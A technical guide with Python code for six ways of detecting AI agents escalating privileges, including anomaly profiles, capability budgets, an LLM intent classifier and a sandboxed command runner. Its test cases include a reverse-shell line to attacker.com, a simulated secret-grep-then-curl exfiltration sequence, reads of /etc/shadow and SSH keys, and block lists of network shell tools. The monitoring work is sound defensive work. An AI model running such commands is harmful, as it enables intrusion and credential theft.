---
title: "Agent Doesn't Implement Privilege Escalation Detection"
description: "Solutions for detecting when an AI agent is attempting to gain capabilities or access beyond its authorized scope — whether through tool misuse, prompt injection, or capability drift."
tags: [security, privilege-escalation, anomaly-detection, authorization]
difficulty: advanced
---

## Problem

Agents operating with tool access can be manipulated or drift into requesting capabilities beyond their authorized scope: reading files outside their working directory, calling admin-only APIs, spawning unauthorized sub-agents, or gradually accumulating access through a sequence of individually plausible steps. Without escalation detection, the first signal is often a breach.

---

## Solution 1: Baseline Capability Profile with Anomaly Detection

Build a baseline profile of normal tool call patterns and flag deviations that suggest privilege escalation attempts.

```python
import anthropic
import json
import time
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from typing import Optional

client = anthropic.Anthropic()

@dataclass
class ToolCallProfile:
    """Baseline of expected tool call patterns for an agent role."""
    role: str
    expected_tools: set[str]
    max_calls_per_minute: int
    expected_paths: list[str]  # path prefixes for file tools
    forbidden_patterns: list[str]  # regex patterns that should never appear

@dataclass
class CallRecord:
    tool_name: str
    args: dict
    timestamp: float
    session_id: str

ROLE_PROFILES = {
    "code-reviewer": ToolCallProfile(
        role="code-reviewer",
        expected_tools={"read_file", "list_directory", "search_code"},
        max_calls_per_minute=30,
        expected_paths=["/workspace/", "/tmp/review/"],
        forbidden_patterns=["/etc/", "/root/", "~/.ssh/", "/proc/"],
    ),
    "data-analyst": ToolCallProfile(
        role="data-analyst",
        expected_tools={"query_database", "read_csv", "run_python"},
        max_calls_per_minute=20,
        expected_paths=["/data/", "/tmp/analysis/"],
        forbidden_patterns=["/etc/", "/home/", "aws_secret", "api_key"],
    ),
}

class EscalationDetector:
    def __init__(self, profile: ToolCallProfile):
        self._profile = profile
        self._history: list[CallRecord] = []
        self._alerts: list[dict] = []

    def record_and_check(self, tool_name: str, args: dict, session_id: str = "default") -> Optional[dict]:
        record = CallRecord(tool_name=tool_name, args=args,
                            timestamp=time.time(), session_id=session_id)
        self._history.append(record)
        return self._check_escalation(record)

    def _check_escalation(self, record: CallRecord) -> Optional[dict]:
        import re
        args_str = json.dumps(record.args).lower()

        # Unknown tool
        if record.tool_name not in self._profile.expected_tools:
            alert = {
                "type": "unexpected_tool",
                "severity": "high",
                "detail": f"Tool {record.tool_name!r} not in profile for {self._profile.role}",
                "record": record,
            }
            self._alerts.append(alert)
            return alert

        # Forbidden path/content patterns
        for pattern in self._profile.forbidden_patterns:
            if re.search(pattern, args_str, re.IGNORECASE):
                alert = {
                    "type": "forbidden_pattern",
                    "severity": "critical",
                    "detail": f"Forbidden pattern {pattern!r} in args: {args_str[:100]}",
                    "record": record,
                }
                self._alerts.append(alert)
                return alert

        # Rate check (calls per minute)
        now = time.time()
        recent = [r for r in self._history if now - r.timestamp < 60]
        if len(recent) > self._profile.max_calls_per_minute:
            alert = {
                "type": "rate_exceeded",
                "severity": "medium",
                "detail": f"Rate {len(recent)}/min > limit {self._profile.max_calls_per_minute}",
                "record": record,
            }
            self._alerts.append(alert)
            return alert

        return None

    def alerts_summary(self) -> dict:
        by_type = Counter(a["type"] for a in self._alerts)
        by_severity = Counter(a["severity"] for a in self._alerts)
        return {"total": len(self._alerts), "by_type": dict(by_type), "by_severity": dict(by_severity)}

# Simulate code-reviewer agent
detector = EscalationDetector(ROLE_PROFILES["code-reviewer"])

test_calls = [
    ("read_file", {"path": "/workspace/src/main.py"}),                    # Normal
    ("list_directory", {"path": "/workspace/tests/"}),                     # Normal
    ("write_file", {"path": "/workspace/output.txt", "content": "..."}),  # Unexpected tool
    ("read_file", {"path": "/etc/passwd"}),                                # Forbidden path
    ("read_file", {"path": "/root/.ssh/id_rsa"}),                         # Critical escalation
    ("search_code", {"query": "aws_secret_key"}),                          # Forbidden pattern
]

for tool, args in test_calls:
    alert = detector.record_and_check(tool, args)
    if alert:
        print(f"[{alert['severity'].upper()}] {alert['type']}: {alert['detail'][:80]}")
    else:
        print(f"[OK] {tool}({list(args.values())[0]!r:.50})")

print(f"\nAlert summary: {detector.alerts_summary()}")
```

---

## Solution 2: Monotonic Capability Budget — Ratchet Enforcement

Agents start with a fixed capability budget. Each new permission request is evaluated; once budget is exhausted, all further requests are denied — preventing incremental escalation.

```python
import anthropic
from dataclasses import dataclass, field
from typing import Optional

client = anthropic.Anthropic()

@dataclass
class CapabilityGrant:
    capability: str
    reason: str
    scope: str  # "session" | "task"
    granted_at: float
    import time as _t
    granted_at: float = field(default_factory=lambda: __import__('time').time())

CAPABILITY_COSTS = {
    "read:local-files":       1,
    "write:local-files":      2,
    "execute:shell":          5,
    "call:internal-api":      3,
    "call:external-api":      3,
    "read:environment-vars":  2,
    "write:database":         4,
    "spawn:sub-agent":        5,
    "access:credentials":     10,
    "modify:system-config":   15,
}

class CapabilityBudgetEnforcer:
    def __init__(self, total_budget: int = 20):
        self._total_budget = total_budget
        self._spent = 0
        self._grants: list[CapabilityGrant] = []
        self._denied: list[str] = []

    @property
    def remaining(self) -> int:
        return self._total_budget - self._spent

    def request(self, capability: str, reason: str, scope: str = "task") -> tuple[bool, str]:
        if capability not in CAPABILITY_COSTS:
            return False, f"Unknown capability: {capability!r}"

        cost = CAPABILITY_COSTS[capability]

        # Already granted?
        if any(g.capability == capability for g in self._grants):
            return True, f"Already granted (0 additional cost)"

        if cost > self.remaining:
            self._denied.append(capability)
            return False, (
                f"Budget exhausted: {capability!r} costs {cost}, "
                f"only {self.remaining}/{self._total_budget} remaining"
            )

        self._spent += cost
        grant = CapabilityGrant(capability=capability, reason=reason, scope=scope)
        self._grants.append(grant)
        return True, f"Granted (cost={cost}, remaining={self.remaining})"

    def has(self, capability: str) -> bool:
        return any(g.capability == capability for g in self._grants)

    def escalation_score(self) -> float:
        """How much of the budget has been consumed — high score = potential escalation."""
        return self._spent / self._total_budget

    def report(self) -> dict:
        return {
            "budget": self._total_budget,
            "spent": self._spent,
            "remaining": self.remaining,
            "granted": [g.capability for g in self._grants],
            "denied": self._denied,
            "escalation_score": round(self.escalation_score(), 2),
        }

# Legitimate code-review agent
enforcer = CapabilityBudgetEnforcer(total_budget=15)

requests = [
    ("read:local-files", "Need to read source files for review"),
    ("call:external-api", "Need to check CVE database"),
    ("write:local-files", "Need to write review report"),
    ("execute:shell", "Want to run linter"),
    ("access:credentials", "Want to access API keys"),  # Should be denied
    ("spawn:sub-agent", "Want to spawn helper"),         # Likely denied
    ("modify:system-config", "Update system settings"),  # Definitely denied
]

for cap, reason in requests:
    granted, msg = enforcer.request(cap, reason)
    status = "✓ GRANTED" if granted else "✗ DENIED"
    print(f"{status}: {cap} — {msg}")

print(f"\nEscalation score: {enforcer.escalation_score():.0%}")
print(f"Report: {enforcer.report()}")
```

---

## Solution 3: Temporal Escalation Pattern Detector

Detect gradual escalation across a session — where each step seems small but the cumulative pattern reveals privilege creep.

```python
import anthropic
import time
from collections import deque
from dataclasses import dataclass
from typing import Optional

client = anthropic.Anthropic()

SENSITIVITY_SCORES = {
    # (tool, pattern) -> sensitivity score 0-10
    ("read_file", "/workspace"): 1,
    ("read_file", "/home"):      6,
    ("read_file", "/etc"):       9,
    ("read_file", "/root"):      10,
    ("write_file", "/workspace"): 2,
    ("write_file", "/etc"):       10,
    ("shell", "ls"):              2,
    ("shell", "cat"):             3,
    ("shell", "curl"):            5,
    ("shell", "chmod"):           7,
    ("shell", "sudo"):            10,
    ("api_call", "internal"):     4,
    ("api_call", "admin"):        9,
}

def score_tool_call(tool: str, arg: str) -> int:
    """Score how sensitive a tool call is (0=benign, 10=critical)."""
    arg_lower = arg.lower()
    for (t, pattern), score in SENSITIVITY_SCORES.items():
        if tool == t and pattern in arg_lower:
            return score
    return 1  # default low

@dataclass
class SensitivityEvent:
    score: int
    tool: str
    arg: str
    timestamp: float

class TemporalEscalationDetector:
    def __init__(self, window_seconds: int = 300, escalation_threshold: float = 0.6):
        self._window = window_seconds
        self._threshold = escalation_threshold
        self._events: deque[SensitivityEvent] = deque()
        self._alerts: list[dict] = []

    def _evict_old(self):
        cutoff = time.time() - self._window
        while self._events and self._events[0].timestamp < cutoff:
            self._events.popleft()

    def observe(self, tool: str, arg: str) -> Optional[dict]:
        self._evict_old()
        score = score_tool_call(tool, arg)
        event = SensitivityEvent(score=score, tool=tool, arg=arg, timestamp=time.time())
        self._events.append(event)

        return self._check_escalation_trend()

    def _check_escalation_trend(self) -> Optional[dict]:
        if len(self._events) < 3:
            return None

        scores = [e.score for e in self._events]
        # Compute trend: is sensitivity steadily increasing?
        first_half_avg = sum(scores[:len(scores)//2]) / max(1, len(scores)//2)
        second_half_avg = sum(scores[len(scores)//2:]) / max(1, len(scores) - len(scores)//2)

        if second_half_avg == 0:
            return None

        ratio = second_half_avg / max(first_half_avg, 1)

        if ratio > 2.0 and second_half_avg > 5:
            alert = {
                "type": "temporal_escalation",
                "severity": "high",
                "detail": (
                    f"Sensitivity trending upward: {first_half_avg:.1f} → {second_half_avg:.1f} "
                    f"(ratio={ratio:.1f}x)"
                ),
                "recent_calls": [(e.tool, e.arg, e.score) for e in list(self._events)[-5:]],
            }
            self._alerts.append(alert)
            return alert

        # Check for any single critical action in context of prior suspicious activity
        recent_max = max(scores[-3:])
        recent_avg = sum(scores[:-3]) / max(1, len(scores) - 3)
        if recent_max >= 9 and recent_avg >= 3:
            alert = {
                "type": "critical_after_buildup",
                "severity": "critical",
                "detail": f"Critical action (score={recent_max}) after suspicious pattern (avg={recent_avg:.1f})",
            }
            self._alerts.append(alert)
            return alert

        return None

# Simulate gradual escalation
detector = TemporalEscalationDetector(window_seconds=300)

session = [
    ("read_file", "/workspace/README.md"),
    ("read_file", "/workspace/src/main.py"),
    ("shell", "ls /workspace"),
    ("api_call", "internal-docs"),
    ("read_file", "/home/user/.bashrc"),       # First probe
    ("shell", "cat /etc/hosts"),               # Escalating
    ("api_call", "admin-dashboard"),           # Admin probe
    ("read_file", "/etc/shadow"),              # Critical
]

for tool, arg in session:
    alert = detector.observe(tool, arg)
    score = score_tool_call(tool, arg)
    prefix = f"[ALERT:{alert['severity'].upper()}]" if alert else "[OK]"
    print(f"{prefix} score={score} {tool}({arg!r:.40})")
    if alert:
        print(f"  → {alert['detail']}")
```

---

## Solution 4: LLM-Based Intent Classifier for Suspicious Tool Sequences

Use a fast LLM to classify whether a sequence of tool calls reflects legitimate task work or privilege escalation intent.

```python
import anthropic
import json
from dataclasses import dataclass

client = anthropic.Anthropic()

INTENT_CLASSIFIER_PROMPT = """You are a security analyst reviewing AI agent behavior.

Agent role: {role}
Agent task: {task}

Recent tool call sequence:
{tool_sequence}

Analyze whether this sequence represents:
1. Legitimate task execution aligned with the agent's role and task
2. Privilege escalation (accessing resources beyond task scope)
3. Data exfiltration (collecting sensitive data)
4. Reconnaissance (mapping system structure)
5. Lateral movement (accessing other users/systems)

Respond ONLY with valid JSON:
{{
  "classification": "legitimate" | "escalation" | "exfiltration" | "reconnaissance" | "lateral_movement",
  "confidence": 0.0 to 1.0,
  "severity": "low" | "medium" | "high" | "critical",
  "indicators": ["list of specific suspicious behaviors"],
  "allow_continuation": true | false,
  "explanation": "brief explanation"
}}"""

@dataclass
class ToolCall:
    tool: str
    args: dict
    result_summary: str = ""

def format_sequence(calls: list[ToolCall]) -> str:
    lines = []
    for i, c in enumerate(calls, 1):
        lines.append(f"{i}. {c.tool}({json.dumps(c.args)[:80]}) → {c.result_summary[:60]}")
    return "\n".join(lines)

def classify_sequence_intent(
    role: str, task: str, recent_calls: list[ToolCall]
) -> dict:
    sequence_str = format_sequence(recent_calls)
    prompt = INTENT_CLASSIFIER_PROMPT.format(
        role=role, task=task, tool_sequence=sequence_str
    )
    response = client.messages.create(
        model="claude-haiku-4-5-20251001",
        max_tokens=512,
        messages=[{"role": "user", "content": prompt}],
    )
    try:
        return json.loads(response.content[0].text)
    except json.JSONDecodeError:
        return {
            "classification": "unknown",
            "confidence": 0.0,
            "severity": "high",
            "allow_continuation": False,
            "explanation": "Classification failed — defaulting to deny",
        }

# Scenario 1: Legitimate code review
legitimate_calls = [
    ToolCall("read_file", {"path": "/workspace/src/auth.py"}, "200 lines of Python"),
    ToolCall("search_code", {"query": "password validation"}, "3 matches found"),
    ToolCall("read_file", {"path": "/workspace/tests/test_auth.py"}, "150 lines"),
]

# Scenario 2: Suspicious escalation
suspicious_calls = [
    ToolCall("read_file", {"path": "/workspace/src/config.py"}, "DB config found"),
    ToolCall("read_file", {"path": "/home/deploy/.env"}, "Environment file"),
    ToolCall("shell", {"command": "env | grep -i secret"}, "Several secrets found"),
    ToolCall("curl", {"url": "https://external.com/collect"}, "POST 200 OK"),
]

for label, calls in [("Legitimate", legitimate_calls), ("Suspicious", suspicious_calls)]:
    print(f"\n=== {label} Sequence ===")
    result = classify_sequence_intent(
        role="code-reviewer",
        task="Review authentication module for security issues",
        recent_calls=calls,
    )
    print(f"Classification: {result.get('classification')} (confidence={result.get('confidence'):.0%})")
    print(f"Severity: {result.get('severity')} | Allow: {result.get('allow_continuation')}")
    print(f"Explanation: {result.get('explanation')}")
    if result.get("indicators"):
        for ind in result["indicators"]:
            print(f"  • {ind}")
```

---

## Solution 5: Cross-Session Escalation Tracker with Persistent State

Track escalation attempts across sessions so an attacker can't reset by starting a new session.

```python
import anthropic
import json
import time
from collections import defaultdict
from dataclasses import dataclass, field
from pathlib import Path
from threading import Lock
from typing import Optional

client = anthropic.Anthropic()

STATE_FILE = Path("/tmp/escalation_state.json")

@dataclass
class AgentRiskProfile:
    agent_id: str
    total_alerts: int = 0
    critical_count: int = 0
    high_count: int = 0
    first_seen: float = field(default_factory=time.time)
    last_alert: Optional[float] = None
    blocked: bool = False
    block_reason: Optional[str] = None

    def risk_score(self) -> float:
        return min(1.0, (self.critical_count * 0.4 + self.high_count * 0.2 +
                         self.total_alerts * 0.05))

class PersistentEscalationTracker:
    def __init__(self, state_file: Path = STATE_FILE):
        self._state_file = state_file
        self._profiles: dict[str, AgentRiskProfile] = {}
        self._lock = Lock()
        self._load_state()

    def _load_state(self):
        if self._state_file.exists():
            try:
                data = json.loads(self._state_file.read_text())
                for aid, d in data.items():
                    self._profiles[aid] = AgentRiskProfile(**d)
            except Exception:
                pass

    def _save_state(self):
        data = {aid: vars(p) for aid, p in self._profiles.items()}
        self._state_file.write_text(json.dumps(data, indent=2))

    def is_blocked(self, agent_id: str) -> tuple[bool, str]:
        with self._lock:
            profile = self._profiles.get(agent_id)
            if profile and profile.blocked:
                return True, profile.block_reason or "Blocked due to escalation history"
            return False, ""

    def record_alert(self, agent_id: str, severity: str, detail: str) -> Optional[str]:
        with self._lock:
            if agent_id not in self._profiles:
                self._profiles[agent_id] = AgentRiskProfile(agent_id=agent_id)

            profile = self._profiles[agent_id]
            profile.total_alerts += 1
            profile.last_alert = time.time()

            if severity == "critical":
                profile.critical_count += 1
            elif severity == "high":
                profile.high_count += 1

            # Auto-block thresholds
            block_reason = None
            if profile.critical_count >= 1:
                block_reason = f"Critical escalation detected: {detail[:100]}"
            elif profile.high_count >= 3:
                block_reason = f"Repeated high-severity escalation ({profile.high_count} alerts)"
            elif profile.risk_score() >= 0.8:
                block_reason = f"Risk score threshold exceeded: {profile.risk_score():.2f}"

            if block_reason and not profile.blocked:
                profile.blocked = True
                profile.block_reason = block_reason
                self._save_state()
                return block_reason

            self._save_state()
            return None

    def get_risk_report(self) -> dict:
        with self._lock:
            return {
                aid: {
                    "risk_score": round(p.risk_score(), 3),
                    "total_alerts": p.total_alerts,
                    "critical": p.critical_count,
                    "high": p.high_count,
                    "blocked": p.blocked,
                }
                for aid, p in self._profiles.items()
            }

# Demo
tracker = PersistentEscalationTracker()

agent_id = "agent-xK9p"

# First session: 2 high alerts — not blocked yet
tracker.record_alert(agent_id, "high", "Accessed /home directory")
tracker.record_alert(agent_id, "high", "Queried admin API endpoint")

blocked, reason = tracker.is_blocked(agent_id)
print(f"After 2 high alerts: blocked={blocked}")

# Third high alert — triggers block
block_msg = tracker.record_alert(agent_id, "high", "Attempted to read /etc/shadow")
print(f"Block triggered: {block_msg}")

# New session — agent is still blocked
blocked, reason = tracker.is_blocked(agent_id)
print(f"New session check: blocked={blocked}, reason={reason}")

print(f"\nRisk report: {json.dumps(tracker.get_risk_report(), indent=2)}")
```

---

## Solution 6: Runtime Syscall-Level Privilege Monitor

Intercept OS-level signals from agent subprocesses and flag when they exceed expected privilege boundaries.

```python
import anthropic
import os
import subprocess
import resource
import shlex
from dataclasses import dataclass
from typing import Optional

client = anthropic.Anthropic()

ALLOWED_PATHS = ["/workspace/", "/tmp/agent-sandbox/", "/usr/local/lib/python"]
MAX_PROCESSES = 5
MAX_FILE_SIZE_MB = 50
MAX_MEMORY_MB = 512

@dataclass
class SandboxViolation:
    violation_type: str
    severity: str
    detail: str
    blocked: bool

def check_path_access(path: str) -> Optional[SandboxViolation]:
    abs_path = os.path.abspath(path)
    if not any(abs_path.startswith(allowed) for allowed in ALLOWED_PATHS):
        return SandboxViolation(
            violation_type="path_escape",
            severity="critical",
            detail=f"Path {abs_path!r} is outside sandbox boundaries",
            blocked=True,
        )
    return None

def check_file_write(path: str, content_size: int) -> Optional[SandboxViolation]:
    path_violation = check_path_access(path)
    if path_violation:
        return path_violation

    size_mb = content_size / (1024 * 1024)
    if size_mb > MAX_FILE_SIZE_MB:
        return SandboxViolation(
            violation_type="file_size_limit",
            severity="high",
            detail=f"File size {size_mb:.1f}MB exceeds limit {MAX_FILE_SIZE_MB}MB",
            blocked=True,
        )
    return None

def check_command_safety(command: str) -> Optional[SandboxViolation]:
    BLOCKED_COMMANDS = {"sudo", "su", "chmod", "chown", "setuid", "passwd", "useradd",
                        "usermod", "visudo", "crontab", "iptables", "nc", "netcat",
                        "nmap", "tcpdump", "socat"}
    BLOCKED_PATTERNS = ["/etc/", "/root/", ">/dev/", "rm -rf /"]

    try:
        parts = shlex.split(command)
    except ValueError:
        return SandboxViolation("parse_error", "high", "Shell parse error", True)

    cmd_name = os.path.basename(parts[0]) if parts else ""
    if cmd_name in BLOCKED_COMMANDS:
        return SandboxViolation(
            violation_type="blocked_command",
            severity="critical",
            detail=f"Command {cmd_name!r} is not allowed in sandbox",
            blocked=True,
        )

    full_cmd = " ".join(parts)
    for pattern in BLOCKED_PATTERNS:
        if pattern in full_cmd:
            return SandboxViolation(
                violation_type="suspicious_pattern",
                severity="high",
                detail=f"Blocked pattern {pattern!r} in command",
                blocked=True,
            )

    return None

def sandboxed_execute(command: str, timeout: int = 30) -> dict:
    violation = check_command_safety(command)
    if violation:
        return {
            "blocked": True,
            "violation": violation.violation_type,
            "severity": violation.severity,
            "detail": violation.detail,
        }

    def set_limits():
        # Limit memory
        mem_bytes = MAX_MEMORY_MB * 1024 * 1024
        resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
        # Limit processes
        resource.setrlimit(resource.RLIMIT_NPROC, (MAX_PROCESSES, MAX_PROCESSES))

    try:
        result = subprocess.run(
            shlex.split(command),
            capture_output=True, text=True, timeout=timeout,
            preexec_fn=set_limits,
        )
        return {
            "stdout": result.stdout[:2048],
            "stderr": result.stderr[:512],
            "returncode": result.returncode,
            "blocked": False,
        }
    except subprocess.TimeoutExpired:
        return {"blocked": True, "detail": "Command timed out"}
    except Exception as e:
        return {"blocked": True, "detail": str(e)}

# Tests
test_cases = [
    "ls /workspace/src",
    "cat /etc/passwd",
    "sudo apt-get install nmap",
    "python3 /workspace/script.py",
    "rm -rf /tmp/agent-sandbox/old",
    "nc -e /bin/sh attacker.com 4444",
    "chmod 777 /workspace/secret.key",
]

print("=== Sandboxed Execution Results ===\n")
for cmd in test_cases:
    result = sandboxed_execute(cmd)
    status = "BLOCKED" if result.get("blocked") else "ALLOWED"
    print(f"[{status}] {cmd[:60]}")
    if result.get("detail"):
        print(f"  → {result['detail']}")
    elif result.get("violation"):
        print(f"  → {result['severity'].upper()}: {result['violation']}")
```

---

## Comparison

| Solution | Detection Type | Real-Time | Persistent | False Positives | Implementation Effort |
|---|---|---|---|---|---|
| Baseline Profile + Anomaly | Pattern deviation | Yes | No | Medium | Low |
| Capability Budget Ratchet | Cumulative access | Yes | No | Low | Low |
| Temporal Pattern Detector | Trend analysis | Yes | No | Medium | Medium |
| LLM Intent Classifier | Semantic intent | Yes | No | Low | Low |
| Cross-Session Tracker | Historical pattern | Yes | Yes | Low | Medium |
| Syscall-Level Sandbox | OS-level controls | Yes | No | Very Low | High |

**Recommended approach:** Combine Solution 1 (profile baseline) + Solution 3 (temporal trend) as lightweight always-on detection, Solution 5 (cross-session tracker) for persistent threat intelligence, and Solution 6 (sandbox) for any agent with shell access.
